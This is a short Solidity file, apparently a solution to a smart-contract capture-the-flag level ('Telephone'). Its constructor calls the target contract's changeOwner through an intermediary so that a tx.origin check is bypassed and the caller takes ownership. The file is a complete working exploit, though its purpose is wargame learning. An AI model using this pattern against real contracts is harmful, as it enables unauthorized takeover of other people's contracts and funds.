// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone{
    function changeOwner(address _owner) external;
}

contract SolutionL4 {

  constructor(address _instance) public {
     ITelephone instant = ITelephone(_instance);
     ITelephone(instant).changeOwner(msg.sender);
  }
}
